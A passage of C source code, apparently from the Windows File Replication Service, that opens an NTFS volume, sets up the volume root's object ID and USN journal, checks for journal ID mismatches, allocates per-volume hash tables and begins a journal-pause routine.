        ForEachListEntry( &VolumeMonitorStopQueue, VOLUME_MONITOR_ENTRY, ListEntry,

            if (pE->FSVolInfo.VolumeSerialNumber == VolumeInfo->VolumeSerialNumber) {
                //
                // Journaling was stopped on this volume by request. E.g.,
                // when a replica set is stopped and restarted in order
                // to pick up a new file or dir filter list.
                //
                // Allow the restart.
                //
                if (WIN_SUCCESS(pE->WStatus)) {
                    //
                    // No more references; free the memory
                    //
                    //
                    // Currently, replica sets continue to refererence
                    // their Vme even after VmeDeactivate(). So don't
                    // free Vmes regardless of their reference count
                    //
                    // if (pE->ReferenceCount == 0) {
                        // FrsRtlRemoveEntryQueueLock(&VolumeMonitorStopQueue,
                                                   // &pE->ListEntry);
                        // FrsFreeType(pE);
                    // }
                    continue;
                }

                //
                // We already tried this one and failed.  Free the entry,
                // close the handle and return with same status as last time.
                //
                WStatus = pE->WStatus;

                ReleaseListLock(&VolumeMonitorStopQueue);

                DPRINT3(4,":S: VME is on stop queue.  %-16ws, VSN: %08X, VolCreTim: %s\n",
                        VolumeInfo->VolumeLabel, VolumeInfo->VolumeSerialNumber,
                        TimeString);
                FrsFreeType(pVme);
                FRS_CLOSE(VolumeHandle);
                return WStatus;
            }
        );

    } else {
        DPRINT_NT(0, ":S: ERROR - Volume root QueryVolumeInformationFile failed.", Status);
        pVme = FrsFreeType(pVme);
        FRS_CLOSE(VolumeHandle);
        Replica->FStatus = FrsErrorVolumeRootDirOpenFail;
        return FrsSetLastNTError(Status);
    }

    //
    // Get the volume root dir object ID.
    // Always open the replica root by masking off the FILE_OPEN_REPARSE_POINT flag
    // because we want to open the destination dir not the junction if the root
    // happens to be a mount point.
    //
    wsprintf( VolumeRootDir, TEXT("%ws\\"), Replica->Volume);
    WStatus = FrsOpenSourceFileW(&RootHandle,
                                 VolumeRootDir,
                                 WRITE_ACCESS, OPEN_OPTIONS & ~FILE_OPEN_REPARSE_POINT);

    if (WIN_ACCESS_DENIED(WStatus)) {
        //
        // For some mysterious reason the root dir on some volumes ends up
        // with the read-only attribute set.  It is currently not understood
        // how this happens (as of 6/2000) but PSS has seen it on a number
        // of cases, generally when DCPromo fails because FRS can't init
        // the sys vol.  We are going to just clear it here and try again.
        // Unfortunately the ATTRIB cmd does not work on the root dir.
        //
        FILE_BASIC_INFORMATION BasicInfo;
        HANDLE hFile;

        WStatus = FrsOpenSourceFileW(&hFile,
                                     VolumeRootDir,
                                     READ_ATTRIB_ACCESS | FILE_WRITE_ATTRIBUTES,
                                     OPEN_OPTIONS & ~FILE_OPEN_REPARSE_POINT);
        DPRINT1_WS(0, "++ JrnlOpen: Open on root dir %ws :", VolumeRootDir, WStatus);

        if (HANDLE_IS_VALID(hFile)) {

            Status = NtQueryInformationFile( hFile,
                                             &Iosb,
                                             &BasicInfo,
                                             sizeof( BasicInfo ),
                                             FileBasicInformation );
            if (NT_SUCCESS( Status )) {

                DPRINT2(0,"Attributes for %s are currently: %0x\n",
                        VolumeRootDir, BasicInfo.FileAttributes );

                    if (BooleanFlagOn(BasicInfo.FileAttributes , FILE_ATTRIBUTE_READONLY)) {
                        ClearFlag(BasicInfo.FileAttributes , FILE_ATTRIBUTE_READONLY);

                        Status = NtSetInformationFile( hFile,
                                                       &Iosb,
                                                       &BasicInfo,
                                                       sizeof( BasicInfo ),
                                                       FileBasicInformation );
                        if (NT_SUCCESS( Status )) {
                            DPRINT(0, "Read-Only attribute cleared succesfully\n" );
                            //
                            // ******** Add event log message saying what we did.
                            //

                        } else {
                            DPRINT_NT(0, "Couldn't set attributes, error status :", Status );
                        }
                    }

                CloseHandle( hFile );

                //
                // Now retry the open.
                //
                WStatus = FrsOpenSourceFileW(&RootHandle,
                                             VolumeRootDir,
                                             WRITE_ACCESS, OPEN_OPTIONS & ~FILE_OPEN_REPARSE_POINT);
            } else {
                DPRINT_NT(0, "Couldn't get attributes, error status :", Status );
                WStatus = FrsSetLastNTError(Status);
                CloseHandle( hFile );
            }
        }
    }

    if (!WIN_SUCCESS(WStatus)) {
        DPRINT1_WS(0, ":S: ERROR - Failed to open the volume root dir: %ws ;",
                   VolumeRootDir, WStatus);

        pVme = FrsFreeType(pVme);
        FRS_CLOSE(VolumeHandle);
        Replica->FStatus = FrsErrorVolumeRootDirOpenFail;
        return WStatus;
    }

    //
    // zero the buffer in case the data that comes back is short.
    //
    ZeroMemory(&ObjectIdBuffer, sizeof(FILE_OBJECTID_BUFFER));

    //
    // Get the Object ID from the volume root.
    //
    Status = NtFsControlFile(
        RootHandle,                      // file handle
        NULL,                            // event
        NULL,                            // apc routine
        NULL,                            // apc context
        &Iosb,                           // iosb
        FSCTL_GET_OBJECT_ID,             // FsControlCode
        &RootHandle,                     // input buffer
        sizeof(HANDLE),                  // input buffer length
        &ObjectIdBuffer,                 // OutputBuffer for data from the FS
        sizeof(FILE_OBJECTID_BUFFER));   // OutputBuffer Length

    if (NT_SUCCESS(Status)) {
        GuidToStr((GUID *)ObjectIdBuffer.ObjectId, GuidStr);
        DPRINT1(4, ":S: Oid for volume root is %s\n", GuidStr );
    } else
    if (Status == STATUS_NOT_IMPLEMENTED) {
        DPRINT1_NT(0, ":S: ERROR - FSCTL_GET_OBJECT_ID failed on file %ws. Object IDs are not enabled on the volume.\n",
                VolumeRootDir, Status);
        Replica->FStatus = FrsErrorUnsupportedFileSystem;
    }

    //
    // If there is no object ID on the root directory put one there.
    // Date : 02/07/2000
    // STATUS_OBJECT_NAME_NOT_FOUND was the old return value
    // and STATUS_OBJECTID_NOT_FOUND is the new return value.
    // Check for both so it works on systems running older and
    // newer ntfs.sys
    //
    if (Status == STATUS_OBJECT_NAME_NOT_FOUND ||
        Status == STATUS_OBJECTID_NOT_FOUND ) {

        FrsUuidCreate((GUID *)ObjectIdBuffer.ObjectId);

        Status = NtFsControlFile(
            RootHandle,                  // file handle
            NULL,                        // event
            NULL,                        // apc routine
            NULL,                        // apc context
            &Iosb,                       // iosb
            FSCTL_SET_OBJECT_ID,         // FsControlCode
            &ObjectIdBuffer,             // input buffer
            sizeof(FILE_OBJECTID_BUFFER),// input buffer length
            NULL,                        // OutputBuffer for data from the FS
            0);                          // OutputBuffer Length

        if (NT_SUCCESS(Status)) {
            GuidToStr((GUID *)ObjectIdBuffer.ObjectId, GuidStr);
            DPRINT1(4, ":S: Oid set on volume root is %s\n", GuidStr );
        } else {
            DPRINT1(0, ":S: ERROR - FSCTL_SET_OBJECT_ID failed on volume root %ws.\n",
                    VolumeRootDir);

            Replica->FStatus = FrsErrorVolumeRootDirOpenFail;
            if (Status == STATUS_NOT_IMPLEMENTED) {
                DPRINT(0, ":S: ERROR - Object IDs are not enabled on the volume.\n");
                Replica->FStatus = FrsErrorUnsupportedFileSystem;
            } else
            if (Status == STATUS_ACCESS_DENIED) {
                DPRINT(0, ":S: ERROR - Access Denied.\n");
            } else {
                DPRINT_NT(0, "ERROR - NtFsControlFile(FSCTL_SET_OBJECT_ID) failed.", Status);
            }
        }
    }

    FRS_CLOSE(RootHandle);

    //
    // If object IDs don't work on the volume then bail.
    //
    if (!NT_SUCCESS(Status)) {
        pVme = FrsFreeType(pVme);
        FRS_CLOSE(VolumeHandle);
        return FrsSetLastNTError(Status);
    }


    //
    // VOLUME ROOT OBJECTID MISMATCH CHECK:
    //
    // Keep the Volume root guid up-to-date in the Db. If it has changed then update it in the config record.
    //
    if (!GUIDS_EQUAL(&(ObjectIdBuffer.ObjectId), &(ConfigRecord->FSVolGuid))) {

        DPRINT1(4,"WARN - Volume root guid mismatch for Replica Set (%ws)\n",Replica->ReplicaName->Name);

        GuidToStr((GUID *)ObjectIdBuffer.ObjectId, GuidStr);
        DPRINT1(4,"WARN - Volume root guid (FS) (%s)\n",GuidStr);

        GuidToStr((GUID *)&(ConfigRecord->FSVolGuid), GuidStr);
        DPRINT1(4,"WARN - Volume root guid (DB) (%s)\n",GuidStr);

        DPRINT1(0,"WARN - Volume root guid updated for Replica Set (%ws)\n",Replica->ReplicaName->Name);

        COPY_GUID(&(ConfigRecord->FSVolGuid), &(ObjectIdBuffer.ObjectId));
        Replica->NeedsUpdate = TRUE;
    }

    //
    // Scan the VolumeMonitorQueue to see if we are already doing this one.
    //
    FrsRtlAcquireQueueLock(&VolumeMonitorQueue);

    ForEachListEntryLock(&VolumeMonitorQueue, VOLUME_MONITOR_ENTRY, ListEntry,
        //
        // Consider changing this test to use the guid on the vol root dir.
        //
        if (pE->FSVolInfo.VolumeSerialNumber == VolumeInfo->VolumeSerialNumber) {

            //
            // Already monitoring this volume.  Free entry and close handle.
            //
            FrsFreeType(pVme);
            pVme = pE;
            FRS_CLOSE(VolumeHandle);

            //
            // Release the lock and Return the Volume Monitor entry pointer.
            //
            //pVme->ActiveReplicas += 1;
            FrsRtlReleaseQueueLock(&VolumeMonitorQueue);
            DPRINT1(4, ":S: Volume %ws already monitored.\n", pVme->FSVolInfo.VolumeLabel);
            //
            // JOURNAL ID MISMATCH CHECK:
            //
            // If LastShutdown is 0 then this is the very first time we have started
            // replication on this replica set so set the current CndUsnJournalID in
            // the config record. Even if Lastshutdown is not 0 CnfUsnJournalID could
            // be 0 because it was not getting correctly updated in Win2K.
            //
            if ((ConfigRecord->LastShutdown == (ULONGLONG)0) ||
                (ConfigRecord->ServiceState == CNF_SERVICE_STATE_CREATING) ||
                (ConfigRecord->CnfUsnJournalID == (ULONGLONG)0)) {

                //
                // Update the JournalID in the Db and set NeedsUpdate so that the
                // config record gets written to the Db at the next update call.
                //
                ConfigRecord->CnfUsnJournalID = pVme->UsnJournalData.UsnJournalID;
                Replica->NeedsUpdate = TRUE;

            } else
                //
                // Check if the JournalID from pVme matches with the CnfUsnJournalID from the
                // config record for this replica set. If it does not then it means that
                // this replica set has been moved. Returning error here will trigger
                // a deletion of the replica set. The set will be recreated at the next
                // poll cycle and it will either be primary or non-auth depending on the
                // case.
                //

            if (ConfigRecord->CnfUsnJournalID != pVme->UsnJournalData.UsnJournalID) {
                //
                // Usn Journal has a new instance code. ==> A delete / create occurred.
                // Treat it as a journal wrap error.
                //

                DPRINT1(0,"ERROR - JournalID mismatch for Replica Set (%ws)\n",Replica->ReplicaName->Name);
                DPRINT2(0,"ERROR - JournalID %x(FS) != %x(DB)\n",
                        pVme->UsnJournalData.UsnJournalID, ConfigRecord->CnfUsnJournalID);
                DPRINT1(0,"ERROR - Replica Set (%ws) is marked to be deleted\n",Replica->ReplicaName->Name);

                Replica->FStatus = FrsErrorMismatchedJournalId;
                JrnlSetReplicaState(Replica, REPLICA_STATE_MISMATCHED_JOURNAL_ID);
                return ERROR_REVISION_MISMATCH;
            }
            *pVmeArg = pVme;
            Replica->FStatus = FrsErrorSuccess;
            return ERROR_SUCCESS;
        }
    );


    //
    //  Create the Usn Journal if it does not exist.
    //
    CfgRegReadDWord(FKC_NTFS_JRNL_SIZE, NULL, 0, &JournalSize);
    CreateUsnJournalData.MaximumSize = (ULONGLONG)JournalSize * (ULONGLONG)(1024 * 1024);

    DPRINT2(4, ":S: Creating NTFS USN Journal on %ws with size %d MB\n",
            Replica->Volume, JournalSize );

    Status = NtFsControlFile( VolumeHandle,
                              NULL,
                              NULL,
                              NULL,
                              &Iosb,
                              FSCTL_CREATE_USN_JOURNAL,
                              &CreateUsnJournalData,
                              sizeof(CreateUsnJournalData),
                              NULL,
                              0 );

    //
    // Query the journal for the Journal ID, the USN info, etc.
    //

    if (!DeviceIoControl(VolumeHandle,
                         FSCTL_QUERY_USN_JOURNAL,
                         NULL,
                         0,
                         &pVme->UsnJournalData,
                         sizeof(USN_JOURNAL_DATA),
                         &BytesReturned,
                         NULL)) {

        WStatus = GetLastError();

        DPRINT1_WS(4, ":S: JrnlOpen: FSCTL_QUERY_USN_JOURNAL on volume %ws :",
                    Replica->Volume, WStatus);

        FrsRtlReleaseQueueLock(&VolumeMonitorQueue);
        pVme = FrsFreeType(pVme);
        FRS_CLOSE(VolumeHandle);

        if (GetDiskFreeSpaceEx(Replica->Root,&FreeBytesAvailableToCaller,&TotalNumberOfBytes,NULL)) {
            //
            // Print the event log message if the available free space is
            // less than 1%. The current problem to initialize
            // the journal could be due to low disk space.
            //
            if ((FreeBytesAvailableToCaller.QuadPart*100) < TotalNumberOfBytes.QuadPart) {
                if ((Replica->Volume != NULL) && (wcslen(Replica->Volume) >= wcslen(L"\\\\.\\D:"))) {
                    //
                    // If we are able to get the volume in the form
                    // \\.\D: then use the volume in the event log so
                    // that we don't print more than one event log
                    // message per volume. If we can't get the
                    // volume then we print the path.
                    //
                    EPRINT1(EVENT_FRS_OUT_OF_DISK_SPACE, &Replica->Volume[4]);
                } else {
                    EPRINT1(EVENT_FRS_OUT_OF_DISK_SPACE, Replica->Root);
                }
            }
            DPRINT3(4, ":S: Disk space check: %ws FreeBytesAvailableToCaller = %08x %08x,TotalNumberOfBytes = %08x %08x\n",
                    Replica->Root,
                    PRINTQUAD(FreeBytesAvailableToCaller.QuadPart),
                    PRINTQUAD(TotalNumberOfBytes.QuadPart));
        }

        Replica->FStatus = FrsErrorJournalInitFailed;
        return WStatus;
    }


    if (BytesReturned != sizeof(USN_JOURNAL_DATA)) {

        WStatus = GetLastError();

        DPRINT2(4, "JrnlOpen: FSCTL_QUERY_USN_JOURNAL bytes returnd: %d, Expected: %d\n",
                BytesReturned, sizeof(USN_JOURNAL_DATA));

        FrsRtlReleaseQueueLock(&VolumeMonitorQueue);
        pVme = FrsFreeType(pVme);
        FRS_CLOSE(VolumeHandle);
        Replica->FStatus = FrsErrorJournalInitFailed;
        return WStatus;
    }

    //
    // Display the USN Journal Data.
    //
    DPRINT1(4, ":S: UsnJournalID    %08x %08x\n", PRINTQUAD(pVme->UsnJournalData.UsnJournalID   ));
    DPRINT1(4, ":S: FirstUsn        %08x %08x\n", PRINTQUAD(pVme->UsnJournalData.FirstUsn       ));
    DPRINT1(4, ":S: NextUsn         %08x %08x\n", PRINTQUAD(pVme->UsnJournalData.NextUsn        ));
    DPRINT1(4, ":S: LowestValidUsn  %08x %08x\n", PRINTQUAD(pVme->UsnJournalData.LowestValidUsn ));
    DPRINT1(4, ":S: MaxUsn          %08x %08x\n", PRINTQUAD(pVme->UsnJournalData.MaxUsn         ));
    DPRINT1(4, ":S: MaximumSize     %08x %08x\n", PRINTQUAD(pVme->UsnJournalData.MaximumSize    ));
    DPRINT1(4, ":S: AllocationDelta %08x %08x\n", PRINTQUAD(pVme->UsnJournalData.AllocationDelta));

    //
    // If the NextUsn is 0 then create a dummy file to increment the usn
    // so that we don't end up picking up a valid change at usn 0.
    //
    if (pVme->UsnJournalData.NextUsn == QUADZERO) {

        FrsCreateFileRelativeById(&DummyHandle,
                                  Replica->PreInstallHandle,
                                  NULL,
                                  0,
                                  FILE_ATTRIBUTE_TEMPORARY,
                                  L"NTFRS_TEMP_FILE.TMP",
                                  (USHORT)(wcslen(L"NTFRS_TEMP_FILE.TMP") * sizeof(WCHAR)),
                                  NULL,
                                  FILE_OPEN_IF,
                                  RESTORE_ACCESS | DELETE);

        if (HANDLE_IS_VALID(DummyHandle)) {
            FrsDeleteByHandle(L"NTFRS_TEMP_FILE.TMP", DummyHandle);
        }

        FRS_CLOSE(DummyHandle);

    }

    //
    //
    // JOURNAL ID MISMATCH CHECK:
    //
    // If LastShutdown is 0 then this is the very first time we have started
    // replication on this replica set so set the current pVme->JrnlReadPoint to
    // the end of the Journal.  Also save the Journal ID so we can detect if
    // someone does a delete/create cycle on the journal.
    // There are cases when the replica set gets created
    // and then shutdown without ever initializing.
    //
    if ((ConfigRecord->LastShutdown == (ULONGLONG)0) ||
        (ConfigRecord->ServiceState == CNF_SERVICE_STATE_CREATING) ||
        (ConfigRecord->CnfUsnJournalID == (ULONGLONG)0)) {

        ConfigRecord->CnfUsnJournalID = pVme->UsnJournalData.UsnJournalID;
        Replica->NeedsUpdate = TRUE;
    } else
    if (ConfigRecord->CnfUsnJournalID != pVme->UsnJournalData.UsnJournalID) {
        //
        // Usn Journal has a new instance code. ==> A delete / create occurred.
        // Treat it as a journal wrap error.
        //
        Replica->FStatus = FrsErrorMismatchedJournalId;
        JrnlSetReplicaState(Replica, REPLICA_STATE_MISMATCHED_JOURNAL_ID);
        FrsRtlReleaseQueueLock(&VolumeMonitorQueue);
        pVme = FrsFreeType(pVme);
        FRS_CLOSE(VolumeHandle);
        return ERROR_REVISION_MISMATCH;
    }

    //
    // Re-open the volume to allow for asynchronous IO. We don't
    // open with the "OVERLAPPED" flag initially because then the
    // above "create journal" doesn't finish in time for us to post
    // a "read journal" request. We get a "INVALID_DEVICE_STATE"
    // status.
    //
    FRS_CLOSE(VolumeHandle);
    VolumeHandle = CreateFile(Replica->Volume,
                              GENERIC_READ | GENERIC_WRITE,
                              FILE_SHARE_READ | FILE_SHARE_WRITE,
                              NULL,
                              OPEN_EXISTING,
                              FILE_FLAG_OVERLAPPED,
                              NULL );

    WStatus = GetLastError();

    if (!HANDLE_IS_VALID(VolumeHandle)) {
        DPRINT1_WS(0, "Can't open file %ws;", Replica->Volume, WStatus);
        FrsRtlReleaseQueueLock(&VolumeMonitorQueue);
        pVme = FrsFreeType(pVme);
        Replica->FStatus = FrsErrorVolumeRootDirOpenFail;
        return WStatus;
    } else {
        DPRINT1(4, ":S: JrnlOpen: Open on volume %ws\n", Replica->Volume);
    }

    //
    // This is a new volume journal add it to the list.
    //
    pVme->VolumeHandle = VolumeHandle;
    pVme->DriveLetter[0] = Replica->Volume[wcslen(Replica->Volume) - 2];
    pVme->DriveLetter[1] = Replica->Volume[wcslen(Replica->Volume) - 1];
    pVme->DriveLetter[2] = UNICODE_NULL;

    //
    // Associate the volume handle with the completion port.
    //
    JournalCompletionPort = CreateIoCompletionPort(
        VolumeHandle,
        JournalCompletionPort,
        (ULONG_PTR) pVme,          // key associated with this handle
        0);

    if (NT_SUCCESS(Status) && (JournalCompletionPort != NULL)) {

        //
        // Set the ref count and put the new entry on the queue.
        // This will get the JournalReadThread to start looking at the
        // completion port.  Save the volume handle.
        //
        pVme->VolumeHandle = VolumeHandle;
        pVme->ActiveReplicas = 0;
        //
        // Start Ref count at 2.  One for being on the VolumeMonitorQueue and
        // one for the initial allocation.  The latter is released at VME shutdown.
        //
        pVme->ReferenceCount = 2;
        pVme->JournalState = JRNL_STATE_INITIALIZING;
        FrsRtlInsertTailQueueLock(&VolumeMonitorQueue, &pVme->ListEntry);

        DPRINT2(4, ":S: Create Usn Journal success on %ws, Total vols: %d\n",
                pVme->FSVolInfo.VolumeLabel, VolumeMonitorQueue.Count);
    } else {

        //
        // Journal creation or CreateIoCompletionPort failed.  Clean up.
        //
        WStatus = GetLastError();
        FrsRtlReleaseQueueLock(&VolumeMonitorQueue);

        DPRINT_NT(0, ":S: ERROR - Create Usn Journal failed.", Status );

        if (JournalCompletionPort == NULL) {
            DPRINT_WS(0, ":S: ERROR - Failed to create IoCompletion port.", WStatus);
            Status = STATUS_UNSUCCESSFUL;
        }

        pVme = FrsFreeType(pVme);
        FRS_CLOSE(VolumeHandle);
        Replica->FStatus = FrsErrorJournalInitFailed;
        return FrsSetLastNTError(Status);
    }

    //
    // Find end of journal for use in recovery and new replica set creates.
    //
    WStatus = JrnlGetEndOfJournal(pVme, &pVme->JrnlRecoveryEnd);

    if (!WIN_SUCCESS(WStatus)) {
        FrsRtlReleaseQueueLock(&VolumeMonitorQueue);
        pVme = FrsFreeType(pVme);
        FRS_CLOSE(VolumeHandle);
        Replica->FStatus = FrsErrorJournalInitFailed;
        return WStatus;
    }

    DPRINT1(3, ":S: Current End of journal at : %08x %08x\n", PRINTQUAD(pVme->JrnlRecoveryEnd));

    if ((ConfigRecord->LastShutdown == (ULONGLONG)0) ||
        (ConfigRecord->ServiceState == CNF_SERVICE_STATE_CREATING) ||
        (ConfigRecord->CnfUsnJournalID == (ULONGLONG)0)) {

        pVme->JrnlReadPoint = pVme->JrnlRecoveryEnd;
        DPRINT1(4, ":S: Initial journal read starting at: %08x %08x\n", PRINTQUAD(pVme->JrnlReadPoint));
    }

    //
    // Allocate a volume filter hash table.
    //
    _snprintf(HashTableName, sizeof(HashTableName), "FT_%ws", VolumeInfo->VolumeLabel);

    pVme->FilterTable = GhtCreateTable(
        HashTableName,                        // Table name
        VOLUME_FILTER_HASH_TABLE_ROWS,        // NumberRows
        OFFSET(FILTER_TABLE_ENTRY, DFileID),  // KeyOffset is dir fid
        sizeof(LONGLONG),                     // KeyLength
        JrnlHashEntryFree,
        JrnlCompareFid,
        JrnlHashCalcFid,
        FRS_JOURNAL_FILTER_PRINT_FUNCTION);

    //
    // Allocate a parent File ID hash table for the volume.
    //
    // The volume parent file ID table is a specialzed Qhash table intended to
    // economize on memory.  There is an entry in this table for every file
    // in a replica set on the volume.  There is one of these tables for each
    // volume.  Its goal in life is to give us the Old Parent Fid for a file
    // after a rename.  The USN journal only provides the new Parent FID.
    // Once we have the old parent FID for a file or dir we can then do a lookup
    // in the Volume Filter Table to determine the file's previous replica set
    // so we can determine if a file or dir has moved across replica sets or
    // out of a replica set entirely.
    //
    //
    pVme->ParentFidTable = FrsAllocTypeSize(QHASH_TABLE_TYPE,
                                            PARENT_FILEID_TABLE_SIZE);
    SET_QHASH_TABLE_HASH_CALC(pVme->ParentFidTable, JrnlHashCalcFid);

    //
    // Allocate an Active Child hash table for the volume.
    //
    pVme->ActiveChildren = FrsAllocTypeSize(QHASH_TABLE_TYPE,
                                            ACTIVE_CHILDREN_TABLE_SIZE);

    SET_QHASH_TABLE_FLAG(pVme->ActiveChildren, QHASH_FLAG_LARGE_KEY);
    SET_QHASH_TABLE_HASH_CALC2(pVme->ActiveChildren, ActiveChildrenHashCalc);
    SET_QHASH_TABLE_KEY_MATCH(pVme->ActiveChildren, ActiveChildrenKeyMatch);
    SET_QHASH_TABLE_FREE(pVme->ActiveChildren, FrsFree);
    //
    // Allocate a USN Write Filter Table for the volume and post the first
    // clean request.
    //
    pVme->FrsWriteFilter = FrsAllocTypeSize(QHASH_TABLE_TYPE,
                                            FRS_WRITE_FILTER_SIZE);
    SET_QHASH_TABLE_HASH_CALC(pVme->FrsWriteFilter, JrnlHashCalcUsn);
    JrnlSubmitCleanWriteFilter(pVme, JRNL_CLEAN_WRITE_FILTER_INTERVAL);


#ifdef RECOVERY_CONFLICT
    //
    // Allocate a Recovery Conflict hash table for the volume.
    //
    pVme->RecoveryConflictTable = FrsAllocTypeSize(QHASH_TABLE_TYPE,
                                                   RECOVERY_CONFLICT_TABLE_SIZE);
    SET_QHASH_TABLE_HASH_CALC(pVme->RecoveryConflictTable, JrnlHashCalcFid);
#endif  // RECOVERY_CONFLICT

    //
    // Allocate a hash table to record file name dependencies between file
    // operations on this volume in the NTFS journal USN record stream.
    // This is called the Name Space Table and it is used to control when
    // a USN record can be merged into a prior change order affecting the same
    // file.  Some examples of when a USN record merge can not be done are
    // given elsewhere, search for USN MERGE RESTRICTIONS.
    //
    pVme->NameSpaceTable = FrsFreeType(pVme->NameSpaceTable);
    pVme->NameSpaceTable = FrsAllocTypeSize(QHASH_TABLE_TYPE, NAME_SPACE_TABLE_SIZE);
    SET_QHASH_TABLE_HASH_CALC(pVme->NameSpaceTable, NoHashBuiltin);

    //
    // Allocate a hash table to record file old names on a rename operation.
    // THe index is the File ID,  the data field has a ptr to a USN record.
    //
    pVme->RenOldNameTable = FrsFreeType(pVme->RenOldNameTable);
    pVme->RenOldNameTable = FrsAllocTypeSize(QHASH_TABLE_TYPE, RENAME_OLD_TABLE_SIZE);
    SET_QHASH_TABLE_HASH_CALC(pVme->RenOldNameTable, JrnlHashCalcFid);
    SET_QHASH_TABLE_FREE(pVme->RenOldNameTable, FrsFree);

    //
    // Allocate a Change Order Aging table for this volume.
    //
    sprintf(HashTableName, "CO_%ws", VolumeInfo->VolumeLabel);

    pVme->ChangeOrderTable = GhtCreateTable(
        HashTableName,                           // Table name
        REPLICA_CHANGE_ORDER_HASH_TABLE_ROWS,    // NumberRows
        REPLICA_CHANGE_ORDER_ENTRY_KEY,          // KeyOffset
        REPLICA_CHANGE_ORDER_ENTRY_KEY_LENGTH,   // KeyLength
        JrnlHashEntryFree,
        JrnlCompareFid,
        JrnlHashCalcFid,
        FRS_JOURNAL_CHANGE_ORDER_PRINT_FUNCTION);

    //
    // Allocate an Active Inbound Change Order hash table for this volume.
    //
    sprintf(HashTableName, "AIBCO_%ws", VolumeInfo->VolumeLabel);

    pVme->ActiveInboundChangeOrderTable = GhtCreateTable(
        HashTableName,                                  // Table name
        ACTIVE_INBOUND_CHANGE_ORDER_HASH_TABLE_ROWS,    // NumberRows
        REPLICA_CHANGE_ORDER_FILEGUID_KEY,              // KeyOffset
        REPLICA_CHANGE_ORDER_FILEGUID_KEY_LENGTH,       // KeyLength
        JrnlHashEntryFree,
        JrnlCompareGuid,
        JrnlHashCalcGuid,
        FRS_JOURNAL_CHANGE_ORDER_PRINT_FUNCTION);

    //
    // Add the volume change order list to the global change order list.
    //
    FrsInitializeQueue(&pVme->ChangeOrderList, &FrsVolumeLayerCOList);
    pVme->InitTime = GetTickCount();

    FrsRtlReleaseQueueLock(&VolumeMonitorQueue);

    //
    // Return the Volume Monitor entry pointer.
    //
    *pVmeArg = pVme;

    return ERROR_SUCCESS;
}



#if 0
ULONG
JrnlCheckStartFailures(
    PFRS_QUEUE Queue
    )
/*++

Routine Description:

    Check for any failures where we couldn't get the first journal read started.

Arguments:

    A queue with Volume Monitor Entries on it.

Return Value:

    ERROR_SUCCESS if all journal reads started.  (the list is empty).

--*/
{
#undef DEBSUB
#define DEBSUB  "JrnlCheckStartFailures:"

    PLIST_ENTRY Entry;
    PVOLUME_MONITOR_ENTRY pVme;
    ULONG WStatus, RetStatus;


    FrsRtlAcquireQueueLock(Queue);

    Entry = GetListHead(&Queue->ListHead);

    if (Entry == &Queue->ListHead) {
        DPRINT(4, ":S: JrnlCheckStartFailures - Queue empty.\n");
    }

    RetStatus = ERROR_SUCCESS;

    while (Entry != &Queue->ListHead) {

        pVme = CONTAINING_RECORD(Entry, VOLUME_MONITOR_ENTRY, ListEntry);

        WStatus = pVme->WStatus;
        RetStatus = ERROR_GEN_FAILURE;

        if (!WIN_SUCCESS(WStatus) && (WStatus != ERROR_IO_PENDING)) {
            //
            // The I/O was not started.  Check error return.
            //

            if (WStatus == ERROR_NOT_FOUND) {
                //
                // Starting USN is not in the Journal.  We may have missed
                // some locally originated changes to the replica.  This
                // is very bad because we now have to walk the replica
                // tree and the IDTable to see what has changed.
                //
                // Walk the replica sets using this VME and compare their
                // starting USNs with the oldest USN record available on
                // the volume.  If it's there then we can at least start
                // those replica sets.  Whats left has to be handled the
                // long way.
                //
                //
                //  add code to sync up the tree
                //
                DPRINT1(0, ":S: Usn %08lx %08lx has been deleted.\n",
                        PRINTQUAD(pVme->JrnlReadPoint));
                DPRINT(0, ":S: Data lost, resync required on Replica ...\n");
                JrnlClose(pVme->VolumeHandle);
            } else {
                DPRINT_WS(0, "Error from JrnlCheckStartFailures", WStatus);
                DPRINT1(0, ":S: ERROR - Replication not started for any replica sets on volume %ws\n",
                        pVme->FSVolInfo.VolumeLabel);
            }
        } else {
            DPRINT_WS(0, "Error from JrnlCheckStartFailures", WStatus);
            DPRINT1(0, ":S: ERROR - Replication should have been started for replica sets on volume %ws\n",
                    pVme->FSVolInfo.VolumeLabel);
        }

        Entry = GetListNext(Entry);
    }

    FrsRtlReleaseQueueLock(Queue);
    return RetStatus;
}
#endif


ULONG
JrnlPauseVolume(
    IN PVOLUME_MONITOR_ENTRY pVme,
    IN DWORD                 MilliSeconds
    )
/*++

Routine Description:

    Pause journal read activity on the specified volume.  This routine
    queues a completion packet to the journal read thread telling it
    to pause I/O the volume.  We then then wait on the event handle in
    the Vme struct.

    Once the read thread stops I/O on the volume it queues a CMD_JOURNAL_PAUSED
    packet to the journal process queue.  When this command is processed we
    know that any prior journal buffers that have been queued for this
    volume are now processed so we can signal the event to let the waiter
    proceed.

Arguments:

    pVme:  The volume to pause.

    MilliSeconds    - Timeout

Return Value:

    Win32 status

--*/

{
#undef DEBSUB
#define DEBSUB  "JrnlPauseVolume:"

    ULONG WStatus;
    ULONG RetryCount = 10;

    DPRINT2(5, "***** Pause on Volume %ws - Journal State: %s *****\n",
            pVme->FSVolInfo.VolumeLabel, RSS_NAME(pVme->JournalState));

RETRY:

    FrsRtlAcquireQueueLock(&VolumeMonitorQueue);

    //
    // Check if paused already.
    //
    if ((pVme->JournalState == JRNL_STATE_PAUSED) ||
        (pVme->JournalState == JRNL_STATE_INITIALIZING)) {
        WStatus = ERROR_SUCCESS;
        goto RETURN;
    }

    //
    // Check if pause is in progress.
    //
    if ((pVme->JournalState == JRNL_STATE_PAUSE1) ||
        (pVme->JournalState == JRNL_STATE_PAUSE2)) {
        goto WAIT;
    }

    //
    // If I/O is not active on this volume then request is invalid.
    //
    if (pVme->JournalState != JRNL_STATE_ACTIVE) {
        WStatus = ERROR_INVALID_FUNCTION;
        goto RETURN;
    }

    //
    // Submit the pause request to the journal read thread.
    //
    WStatus = JrnlSubmitReadThreadRequest(pVme,
                                          FRS_PAUSE_JOURNAL_READ,
                                          JRNL_STATE_PAUSE1);
    if (WStatus == ERROR_BUSY) {
        //
        // Overlapped struct is in use. Retry a few times then bail.
        //
        FrsRtlReleaseQueueLock(&VolumeMonitorQueue);
        if (--RetryCount == 0) {
            return ERROR_BUSY;
        }
        Sleep(250);
        goto RETRY;
    }

WAIT:
    //
    // Drop the lock and wait on the event.
    //
    FrsRtlReleaseQueueLock(&VolumeMonitorQueue);

    WStatus = WaitForSingleObject(pVme->Event, MilliSeconds);
    CHECK_WAIT_ERRORS(3, WStatus, 1, ACTION_RETURN);

    //
    // Check the result state.
    //
    FrsRtlAcquireQueueLock(&VolumeMonitorQueue);
